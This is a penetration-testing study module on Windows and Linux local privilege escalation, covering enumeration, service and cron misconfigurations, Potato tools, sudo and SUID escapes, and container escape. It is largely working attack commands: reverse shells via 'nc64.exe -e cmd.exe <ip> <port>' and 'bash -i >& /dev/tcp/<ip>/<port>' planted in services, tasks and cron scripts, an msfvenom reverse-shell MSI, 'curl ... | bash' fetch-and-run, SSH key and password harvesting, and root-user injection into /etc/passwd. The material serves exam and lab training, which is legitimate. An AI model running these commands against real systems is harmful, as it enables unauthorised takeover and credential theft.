# 08 - Windows & Linux Privilege Escalation

**Author:** Zeeshan
**GitHub:** https://github.com/mzeeshanzafar28
**LinkedIn:** https://www.linkedin.com/in/mzeeshanzafar28

Once you have any foothold (a low-privilege shell, a web shell, an AD user context), the next question is always: how do I become root/SYSTEM/Domain Admin from here? This module covers local privilege escalation on both platforms. AD-specific escalation (Kerberoasting, DCSync, etc.) lives in the Active Directory module.

---

## Table of Contents

1. [General Methodology](#general-methodology)
2. [Windows Privilege Escalation](#windows-privilege-escalation)
3. [Linux Privilege Escalation](#linux-privilege-escalation)
4. [Automated Enumeration Scripts](#automated-enumeration-scripts)
5. [Quick Decision Guides](#quick-decision-guides)
6. [Tool-to-Technique Map](#tool-to-technique-map)
7. [Practice](#practice)

---

## General Methodology

Privilege escalation is fundamentally a **search problem**: enumerate everything about the system and look for a gap between what a low-privilege account is *allowed* to touch and what it is *able* to touch.

**The Golden Sequence:**

1. Who am I and what privileges do I already have?
2. What is the system (OS version, architecture, patches)?
3. What interesting files, services, tasks, and permissions exist?
4. Are there stored credentials or tokens I can reuse?
5. Is there a known local exploit for this exact version?
6. Escalate → stabilize → loot → pivot.

**Always start with manual, targeted enumeration first**, then run an automated script as a safety net to catch anything you missed — not the other way around. Automated tools produce a wall of output that's easy to skim past the one line that matters if you don't already have a hypothesis to check it against.

---

## Windows Privilege Escalation

### Initial Enumeration

```cmd
whoami
whoami /priv
whoami /groups
whoami /all
systeminfo
hostname
net user
net user <username>
net localgroup administrators
netstat -ano
ipconfig /all
route print
```

### Key Privileges to Recognize

| Privilege | Exploit Path |
|---|---|
| **SeImpersonatePrivilege** | Potato family, PrintSpoofer, GodPotato → SYSTEM |
| **SeAssignPrimaryTokenPrivilege** | Same as SeImpersonate; Potato-style token capture → SYSTEM |
| **SeBackupPrivilege** | Read sensitive files (SAM, SYSTEM, NTDS.dit) |
| **SeRestorePrivilege** | Write files with SYSTEM privileges |
| **SeDebugPrivilege** | Inject into privileged processes, dump LSASS |
| **SeTakeOwnershipPrivilege** | Take ownership of files/registry keys → modify them |
| **SeLoadDriverPrivilege** | Load vulnerable kernel drivers |

The presence of a privilege is not automatically exploitable. Determine: whether it's enabled, which process has it, what Windows version/build, what abuse path applies, and whether mitigations block the technique.

### Integrity Levels

```
System      ← NT AUTHORITY\SYSTEM (highest local privilege)
High        ← Elevated Administrator process
Medium      ← Normal interactive user
Low         ← Sandboxed processes (IE protected mode)
```

Check: `whoami /groups` — look for "Mandatory Label" entries.

### Access Tokens

A Windows access token contains: User SID, Group SIDs, Privileges, Integrity Level, Authentication information.

```powershell
[System.Security.Principal.WindowsIdentity]::GetCurrent()
```

---

### Service Misconfigurations

Services often run as `NT AUTHORITY\SYSTEM`. If you can modify how they start or what they execute, you own the machine.

**Enumerate services:**

```cmd
sc query state= all

# Inspect service config
sc qc <ServiceName>
```

**PowerShell:**

```powershell
Get-Service
Get-Service | Where-Object {$_.Status -eq 'Running'}

# Detailed service info
Get-CimInstance Win32_Service |
  Select-Object Name,DisplayName,State,StartMode,StartName,PathName

# Services running as SYSTEM
Get-CimInstance Win32_Service |
  Where-Object {$_.StartName -eq 'LocalSystem'} |
  Select-Object Name,State,StartMode,PathName
```

**Check file permissions on service binaries:**

```cmd
icacls "C:\Path\To\Service.exe"
icacls "C:\Path\To\Service\Directory"
```

**Weak service file permissions:** If a service runs as SYSTEM and its binary path is writable by your current user, replace it with a malicious executable, then restart the service:

```cmd
sc stop <svc>
copy malicious.exe "C:\Path\To\Service.exe" /Y
sc start <svc>
```

Look for write permissions granted to: `BUILTIN\Users`, `Authenticated Users`, `Everyone`, your specific user/group.

**Modifiable service configuration:** If you have `SERVICE_CHANGE_CONFIG` permission:

```cmd
sc config <ServiceName> binPath= "C:\Temp\nc64.exe -e cmd.exe <ip> <port>"
sc start <ServiceName>
```

---

### Unquoted Service Paths

If a service's binary path contains spaces and isn't wrapped in quotes:

```
C:\Program Files\My App\service.exe   ← VULNERABLE
"C:\Program Files\My App\service.exe"  ← SAFE
```

Windows tries each space-delimited segment in order:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My App\service.exe` (the real one)

If you have write access to an earlier directory, drop a malicious executable there.

**Find unquoted paths:**

```powershell
Get-CimInstance Win32_Service |
  Where-Object {$_.PathName -match ' ' -and $_.PathName -notmatch '^"'} |
  Select-Object Name,StartName,PathName
```

Or with WMIC:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\"
```

**Exploitation chain requires:**
1. Ambiguous executable path
2. A writable location in the search chain
3. A privileged service
4. Service restart capability (or boot-triggered start)

---

### AlwaysInstallElevated

If both registry keys are set to `0x1`, any user can install an MSI package with SYSTEM privileges:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Both must return `0x1`.**

**Exploitation:**

```bash
# Generate malicious MSI (from Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f msi -o evil.msi
```

```cmd
REM Transfer and execute on target
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

---

### Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
```

Look for tasks running as SYSTEM that execute scripts/binary paths your user can modify:

```cmd
echo c:\tools\nc64.exe -e cmd.exe <ip> <port> > C:\tasks\tasktorun.bat
schtasks /run /tn <TaskName>
```

---

### Token Impersonation (Potato Family)

If you have **SeImpersonatePrivilege** (common for service/IIS app-pool accounts):

```cmd
whoami /priv
```

If `SeImpersonatePrivilege` is present and **enabled**, this is almost always a fast path to SYSTEM.

| Tool | Windows Version | Notes |
|---|---|---|
| **PrintSpoofer** | Win10/Server 2016+ | Most reliable; abuses named pipe impersonation |
| **GodPotato** | Win11/Server 2022 | Latest; uses multiple COM object coercions |
| **JuicyPotato** | Win7-Win10/Server 2008-2016 | Classic; requires specific CLSID |
| **RoguePotato** | Win10/Server 2019 | Alternative to Juicy on newer builds |
| **SweetPotato** | Win10/Server 2016+ | Combines multiple techniques |

**Usage (PrintSpoofer example):**

```cmd
PrintSpoofer.exe -i -c "cmd.exe"
PrintSpoofer.exe -c "powershell -enc <base64-reverse-shell>"
```

**GodPotato:**

```cmd
GodPotato.exe -cmd "cmd.exe"
```

The correct approach is: check `whoami /priv` → identify Windows version/build → select applicable tool → validate.

---

### DLL Hijacking

If an application loads a DLL by name without a fully-qualified path, and Windows' DLL search order lets you place a malicious DLL earlier in the search chain, your code executes in that application's context.

**Windows DLL Search Order (simplified):**
1. Directory from which the application was loaded
2. System directory (`C:\Windows\System32`)
3. 16-bit system directory
4. Windows directory (`C:\Windows`)
5. Current working directory
6. Directories in PATH environment variable

**Investigation:**

```cmd
where.exe application.exe
icacls "C:\Program Files\Application"
```

Use Process Monitor (Sysinternals) on a matching test system to observe failed DLL lookups:

- Filter: `Operation = CreateFile`, `Result = NAME NOT FOUND`, `Path ends with .dll`

This is much more reliable than blindly copying DLLs into directories.

---

### UAC Bypass

User Account Control separates admin credentials from elevated processes.

**Check current state:**

```cmd
whoami /groups
```

UAC bypass techniques are highly version and configuration dependent. Determine:

1. Current user
2. Whether account is an administrator
3. Current integrity level
4. UAC configuration level
5. Applicable bypass condition

**Built-in auto-elevate bypasses** exploit applications that are marked `autoElevate` and load DLLs from writable locations (e.g., `fodhelper.exe`, `computerdefaults.exe` — version-specific).

Do not treat "Administrator" as equivalent to "SYSTEM."

---

### Registry Enumeration

```cmd
reg query HKLM\SOFTWARE
reg query HKCU\SOFTWARE

# Search for passwords in registry
reg query HKLM\SOFTWARE /s /f password
```

**Autorun/Startup locations:**

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

**Installed software:**

```powershell
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
```

---

### Credential Discovery

Credentials may exist in:

- Configuration files: `C:\Unattend.xml`, `C:\Windows\Panther\Unattend.xml`, `C:\Windows\system32\sysprep.inf`
- PowerShell history: `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- Saved credentials: `cmdkey /list`
- IIS connection strings: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
- PuTTY sessions: `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
- Scheduled task arguments
- Scripts and deployment files
- Browser credential stores

**PowerShell history:**

```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
```

**Saved credentials:**

```cmd
cmdkey /list
# If credentials are saved:
runas /savecred /user:admin cmd.exe
```

**Search for interesting files:**

```cmd
dir /s /b *pass* *cred* *vnc* *.config*
findstr /si password *.xml *.ini *.txt *.config
```

---

### Windows Defender and Security Products

```powershell
Get-MpComputerStatus
Get-Service | Where-Object {$_.DisplayName -match 'Defender|Security|Endpoint|EDR|Antivirus'}
```

A penetration test should first determine whether endpoint defense is detecting or blocking the test.

---

### Kernel Exploits

Check OS version and patches first:

```cmd
systeminfo
wmic qfe list
```

Cross-reference against known unpatched LPE CVEs. Known CPENT-relevant Windows kernel exploits:

- **MS16-032** (Secondary Logon Handle)
- **MS16-135** (Win32k)
- **CVE-2021-36934** (HiveNightmare/SeriousSAM — SAM file readable by non-admin users)

**Windows Exploit Suggester:**

```bash
# On attacker machine (with systeminfo output)
windows-exploit-suggester.py --database <xls> --systeminfo systeminfo.txt
```

Prefer configuration abuse over kernel exploits when possible — kernel exploits are more likely to crash the system and be detected.

---

### Post-Exploitation (After Escalation)

```cmd
whoami
whoami /all
systeminfo
ipconfig /all
route print
netstat -ano
```

Check domain membership:

```cmd
systeminfo | findstr /B /C:"Domain"
echo %USERDOMAIN%
echo %LOGONSERVER%
```

If the system is domain-joined, shift into AD workflow (credential dumping, lateral movement).

---

### Full Windows Privilege Escalation Checklist

```
[ ] whoami /all
[ ] systeminfo
[ ] hostname
[ ] ipconfig /all | route print | arp -a
[ ] net user | net localgroup Administrators
[ ] net accounts
[ ] netstat -ano
[ ] tasklist /v
[ ] sc query
[ ] schtasks /query /fo LIST /v
[ ] whoami /priv
[ ] Get-MpComputerStatus
[ ] AlwaysInstallElevated check
[ ] Unquoted service paths
[ ] Service binary/directory permissions
[ ] Installed software (wmic product / registry)
[ ] Writable directories in PATH
[ ] DLL search order in application dirs
[ ] Registry autoruns (Run, RunOnce)
[ ] Credential files (Unattend.xml, PowerShell history, cmdkey)
[ ] cmdkey /list → runas /savecred
[ ] Kernel exploit match (WES-NG or manual)
[ ] Token privileges → Potato/PrintSpoofer
[ ] UAC check → bypass if applicable
```

---

## Linux Privilege Escalation

### Initial Enumeration

```bash
id
whoami
sudo -l
uname -a
cat /etc/os-release
hostname
ip a
cat /etc/passwd
cat /etc/group
ps aux
ss -tulnp
env
```

---

### Kernel Version and Exploits

```bash
uname -a                     # kernel version, architecture
cat /etc/os-release          # distro and version
cat /proc/version            # detailed kernel info
```

Search the exact kernel/distro version against known LPE CVEs. Common exam-relevant examples:

| Exploit | CVE | Affects | Technique |
|---|---|---|---|
| **Dirty COW** | CVE-2016-5195 | Kernel < 4.8.3 (2016) | Race condition in COW — write to read-only files |
| **Dirty Pipe** | CVE-2022-0847 | Kernel 5.8 - 5.16 | Overwrite any file, including read-only |
| **PwnKit** | CVE-2021-4034 | pkexec (all versions) | Out-of-bounds write in pkexec |
| **OverlayFS** | CVE-2021-3493, CVE-2023-2640 | Various kernel versions | OverlayFS privileges to root |

**Dirty COW example:** Overwrite `/etc/passwd` and add a new root-equivalent user, or modify a SUID binary in place.

```bash
searchsploit linux kernel <version>
# or use: linux-exploit-suggester.sh
```

---

### Sudo Misconfigurations

```bash
sudo -l
```

Lists what commands the current user can run as root (with or without password).

If a binary isn't itself designed for privilege separation (e.g., `sudo vim`, `sudo find`, `sudo less`), you can typically break out to a root shell.

**Common sudo escape examples — always check GTFOBins:**

```bash
# vim/vi
sudo vim -c ':!sh'

# less/more
sudo less /etc/hosts
# Then: !sh

# find
sudo find . -exec /bin/sh \; -quit

# python / perl / ruby
sudo python -c 'import os; os.system("/bin/sh")'

# nmap (old versions with --interactive)
sudo nmap --interactive
nmap> !sh

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# systemctl
sudo systemctl
# Then: !sh

# man
sudo man man
# Then: !sh

# git
sudo git -p help config
# Then: !/bin/sh

# cp/mv
# If you can copy files as root, overwrite /etc/passwd or /etc/sudoers
```

---

### SUID / SGID Binaries

Any binary with the SUID bit set runs with the *file owner's* privileges, not the invoking user's. If the owner is root and the binary can be made to execute arbitrary commands, you have an escalation path.

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
```

Cross-reference discovered binaries against **GTFOBins** (https://gtfobins.github.io) — a curated list of Unix binaries and exactly how to abuse each one.

**Common exploitable SUID binaries:**

```bash
# If /bin/bash has SUID
bash -p

# find
./find . -exec /bin/sh -p \; -quit

# vim
./vim -c ':!sh'

# less
./less /etc/passwd
# Then: !sh

# nmap (SUID, old versions)
./nmap --interactive
nmap> !sh

# python (rare, custom SUID)
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

---

### Linux Capabilities

Modern alternative/supplement to SUID — grants specific privileged operations without full root.

```bash
getcap -r / 2>/dev/null
```

**Dangerous capabilities:**

| Capability | Abuse Path |
|---|---|
| `cap_setuid+ep` | Binary can set its UID to 0 → `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| `cap_setgid+ep` | Set GID — similar to setuid |
| `cap_dac_override+ep` | Bypass file permission checks — read/write protected files |
| `cap_dac_read_search+ep` | Bypass file read permission checks |
| `cap_chown+ep` | Change file ownership — take ownership of /etc/shadow |
| `cap_sys_admin+ep` | Mount operations, namespaces, etc. |
| `cap_sys_ptrace+ep` | Ptrace privileged processes |
| `cap_net_raw+ep` | Raw sockets, packet injection |

**Example:** If `python3` has `cap_setuid+ep`:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

---

### Cron Jobs

Scheduled tasks that may run as root:

```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
crontab -l
systemctl list-timers
```

If a cron job runs as root and executes a script writable by your current user, edit it:

```bash
# Inject reverse shell into writable cron script
echo 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' >> /path/to/writable/cron/script.sh

# Or add SUID bash
echo 'chmod u+s /bin/bash' >> /path/to/writable/cron/script.sh
# Wait for next execution, then: /bin/bash -p
```

---

### PATH Hijacking

If a root-run script or SUID binary calls another program without a full path, and your user's PATH is searched first:

```bash
# Check current PATH
echo $PATH

# If /tmp is in PATH and searched before /bin:
echo '/bin/sh' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH

# Now when a root script calls 'cat' → your malicious /tmp/cat runs as root
```

---

### Writable Files and Directories

```bash
# Find writable directories
find / -writable -type d 2>/dev/null

# Find writable files owned by root
find / -writable -type f 2>/dev/null | grep -v /proc

# Check critical files
ls -la /etc/passwd /etc/shadow /etc/sudoers
```

**Writable /etc/passwd (Classic — Inject root user):**

```bash
# Generate password hash
openssl passwd -1 -salt xyz newpassword
# Output: $1$xyz$HASH_HERE

# Add root-equivalent user (UID=0, GID=0)
echo 'rootuser:$1$xyz$HASH_HERE:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new root user
su rootuser
```

**Writable /etc/shadow** (if readable + writable):

```bash
# Generate hash for known password
openssl passwd -1 newpassword

# Replace root's hash in /etc/shadow
# Copy /etc/shadow, replace root's hash, then su root
```

**Writable /etc/sudoers:**

```bash
echo 'lowprivuser ALL=(ALL:ALL) ALL' >> /etc/sudoers
sudo su -
```

---

### unshadow (Password Cracking)

Used when you have read access to both `/etc/passwd` and `/etc/shadow`:

```bash
unshadow passwd.txt shadow.txt > unshadowed.txt
hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt
# or: john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### Password and Key Harvesting

```bash
# Search for passwords in common locations
grep -r "password" /home 2>/dev/null
grep -r "passwd" /var/www 2>/dev/null

# Bash history
cat ~/.bash_history
cat /root/.bash_history    # if readable

# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Config files
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | while read f; do grep -H "password" "$f" 2>/dev/null; done
```

---

### NFS Root Squashing Disabled

If an NFS share is configured with `no_root_squash`:

```bash
# Check NFS exports (from attacker)
showmount -e <target-ip>

# Mount the share
sudo mount -t nfs <target-ip>:/exported/path /mnt/nfs -o nolock

# Create SUID binary as root on mounted share
# Then execute it on the target
```

---

### Docker / Container Escape

If you're inside a Docker container:

```bash
# Check if we're in a container
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# Mount host filesystem (if --privileged)
fdisk -l
mount /dev/sda1 /mnt

# Docker socket access → escape
docker run -v /:/host -it alpine chroot /host bash
```

---

### Process Monitoring (pspy)

`pspy` monitors processes without root permissions — invaluable for spotting cron jobs, admin commands, and password leaks:

```bash
# Transfer pspy to target and run
./pspy64
```

Watch for: cron jobs, password arguments in commands, admin SSH sessions, backup scripts.

---

### Full Linux Privilege Escalation Checklist

```
[ ] id; whoami
[ ] uname -a; cat /etc/os-release; cat /proc/version
[ ] sudo -l
[ ] find / -perm -4000 -type f 2>/dev/null  (SUID)
[ ] find / -perm -2000 -type f 2>/dev/null  (SGID)
[ ] getcap -r / 2>/dev/null
[ ] cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers
[ ] echo $PATH
[ ] find / -writable -type d 2>/dev/null
[ ] ls -la /etc/passwd /etc/shadow /etc/sudoers
[ ] grep -r "password" /home 2>/dev/null
[ ] cat ~/.bash_history
[ ] ls -la ~/.ssh/
[ ] ps aux | grep root
[ ] ss -tulnp (internal services)
[ ] env
[ ] mount; df -h (NFS, filesystem access)
[ ] cat /proc/1/cgroup | grep docker (container check)
[ ] Kernel exploit match (linux-exploit-suggester/searchsploit)
[ ] pspy (process monitoring)
```

---

## Automated Enumeration Scripts

Use these as a **second pass**, after manual checks, to catch anything missed:

| Tool | Platform | Notes |
|---|---|---|
| **WinPEAS** | Windows | Most comprehensive; color-coded output highlights likely wins |
| **LinPEAS** | Linux | Most comprehensive Linux enumeration; color-coded by severity |
| PowerUp.ps1 | Windows | PowerShell-specific service/registry/token hunter |
| Seatbelt | Windows | .NET situational awareness; broader system survey |
| SharpUp | Windows | C# privesc check (services, paths, registry) |
| Watson | Windows | Missing patch enumeration |
| PrivescCheck | Windows | PowerShell privesc enumeration, reliable |
| WES-NG | Windows | Patch comparison against known CVEs |
| LinEnum | Linux | Older, lightweight alternative to LinPEAS |
| linux-exploit-suggester | Linux | Matches kernel version to known exploits |
| pspy | Linux | Process monitoring without root — watch for cron/admin activity |

**Transfer and run (Linux example):**

```bash
# Attack box:
python3 -m http.server 8000

# Target:
curl http://<your-ip>:8000/linpeas.sh | bash

# Or save and review:
wget http://<your-ip>:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee linpeas_output.txt
```

**Windows file transfer:**

```powershell
# PowerShell
Invoke-WebRequest -Uri http://<your-ip>/winpeas.exe -OutFile C:\Windows\Temp\winpeas.exe

# certutil
certutil -urlcache -f http://<your-ip>/winpeas.exe C:\Windows\Temp\winpeas.exe
```

---

## Quick Decision Guides

### Windows Quick Decision Tree

```
START
 |
 +-- whoami /priv
 |     |
 |     +-- SeImpersonatePrivilege? → PrintSpoofer / GodPotato / JuicyPotato
 |     +-- SeBackupPrivilege? → Read SAM/SYSTEM, dump hashes
 |     +-- SeDebugPrivilege? → Dump LSASS, migrate to SYSTEM process
 |
 +-- Check services
 |     +-- Writable binary? → Replace with reverse shell
 |     +-- Unquoted path? → Plant malicious exe in search path
 |     +-- Modifiable config? → sc config to change binPath
 |
 +-- Check AlwaysInstallElevated → MSI payload
 |
 +-- Check scheduled tasks → Writable script/binary
 |
 +-- Check UAC → Bypass if admin + medium integrity
 |
 +-- Check credentials → cmdkey /list, PowerShell history, files
 |
 +-- Check kernel/patch level → WES-NG / manual match
```

### Linux Quick Decision Tree

```
START
 |
 +-- sudo -l
 |     +-- Shows interesting commands? → GTFOBins for each binary
 |
 +-- SUID / SGID
 |     +-- Unusual SUID binary? → GTFOBins
 |
 +-- getcap -r /
 |     +-- cap_setuid/cap_setgid? → Abuse directly
 |
 +-- Cron jobs
 |     +-- Writable script? → Inject payload
 |
 +-- Writable /etc/passwd → Add root-equivalent user
 |
 +-- Kernel
 |     +-- Very old/unpatched? → DirtyCow, DirtyPipe, PwnKit, etc.
 |
 +-- Process monitor (pspy) → Spot admin activities/creds
 |
 +-- Otherwise → LinPEAS → Read highlighted sections
```

---

## Tool-to-Technique Map

### Windows

| Technique | Primary Tool | Key Command |
|---|---|---|
| System enumeration | systeminfo | `systeminfo` |
| Privilege enumeration | whoami | `whoami /priv` |
| Service config | sc | `sc qc <ServiceName>` |
| File permissions | icacls | `icacls "C:\Path\file.exe"` |
| Find unquoted paths | PowerShell | `Get-CimInstance Win32_Service \| Where {$_.PathName -notmatch '^"'}` |
| Token impersonation | PrintSpoofer | `PrintSpoofer.exe -c "cmd.exe"` |
| AlwaysInstallElevated | msiexec | `msiexec /quiet /qn /i evil.msi` |
| Scheduled tasks | schtasks | `schtasks /query /fo LIST /v` |
| Saved credentials | cmdkey | `cmdkey /list` |
| Credential dump | Mimikatz | `sekurlsa::logonpasswords` |
| Automated check | WinPEAS | `winpeas.exe` |
| Missing patches | Watson / WES-NG | `python wes.py systeminfo.txt` |
| MSI payload gen | msfvenom | `msfvenom -p windows/x64/shell_reverse_tcp ... -f msi` |

### Linux

| Technique | Primary Tool | Key Command |
|---|---|---|
| Kernel version | uname | `uname -a` |
| Sudo check | sudo | `sudo -l` |
| SUID find | find | `find / -perm -4000 -type f 2>/dev/null` |
| Capabilities | getcap | `getcap -r / 2>/dev/null` |
| Cron jobs | crontab | `cat /etc/crontab` |
| Writable files | find | `find / -writable -type d 2>/dev/null` |
| Password hash generate | openssl | `openssl passwd -1 newpassword` |
| Password cracking | hashcat | `hashcat -m 1800 unshadowed.txt rockyou.txt` |
| unshadow | unshadow | `unshadow passwd.txt shadow.txt > combined.txt` |
| NFS check | showmount | `showmount -e <target-ip>` |
| Process monitor | pspy | `./pspy64` |
| Automated check | LinPEAS | `curl <ip>/linpeas.sh \| bash` |
| Kernel exploit search | searchsploit | `searchsploit linux kernel <version>` |
| GTFOBins | Web | https://gtfobins.github.io |

---

## Practice

### Windows
- **TryHackMe:** "Windows Privilege Escalation", "Alfred", "Juicy Details", "Wreath" (privesc + pivoting), "Steel Mountain", "Blue".
- **HackTheBox:** Any Windows machine with a privesc step (Devel, Optimum, Bastion, Legacy, Blue).
- **Local lab:** Windows Server eval VM + deliberately misconfigure services. Practice with WinPEAS to recognize vulnerable configurations.

### Linux
- **TryHackMe:** "Linux Privilege Escalation", "Common Linux Privesc", "Vulnversity", "Basic Pentesting", "Kenobi".
- **HackTheBox:** Linux machines with privesc (Lame, Bashed, Shocker, Nibbles).
- **OverTheWire:** Bandit (basics) then Narnia/Behemoth for privesc-specific wargames.
- **VulnHub:** Large catalog of downloadable vulnerable VMs built around specific privesc techniques.

### Goal
Be able to escalate from a standard user to SYSTEM/root on a new machine in under 15-20 minutes using enumeration scripts + manual verification. Once privilege escalation is reliable, credential dumping and lateral movement become much easier, which feeds directly into the Active Directory and pivoting success.
